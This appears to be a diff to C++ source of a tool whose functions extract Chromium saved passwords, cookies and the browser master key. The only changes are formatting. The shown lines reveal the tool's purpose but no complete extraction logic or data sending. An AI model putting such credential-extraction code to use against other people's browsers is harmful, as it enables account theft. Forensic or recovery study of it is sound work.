@@ -51,7 +51,7 @@ stringstream ChromiumProcessor::ExtractChromiumPasswords()
     sqlite3_stmt *pStmt;
     int rc, i;
     rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
-    if (rc!=SQLITE_OK)
+    if(rc!=SQLITE_OK)
     {
         dump<<"statement failed rc="<<rc<<endl;
         return dump;
@@ -131,7 +131,7 @@ int ChromiumProcessor::ExtractChromiumCookies()
 
     int rc;
     rc=sqlite3_prepare(ChromiumDB, sql.c_str(), -1, &pStmt, 0);
-    if (rc!=SQLITE_OK)
+    if(rc!=SQLITE_OK)
     {
         cerr<<"sqlite: statement failed, rc="<<rc<<endl;
         return -1;
@@ -190,7 +190,7 @@ unsigned char *ChromiumProcessor::ExtractChromiumMasterKey()
         cerr<<"file don't exists: "<<LocalStateFile_path<<endl;
         return 0;
     }
-    if (LocalStateFile_path!=prevBrowser_path)
+    if(LocalStateFile_path!=prevBrowser_path)
     {
         prevBrowser_path=LocalStateFile_path;
     }
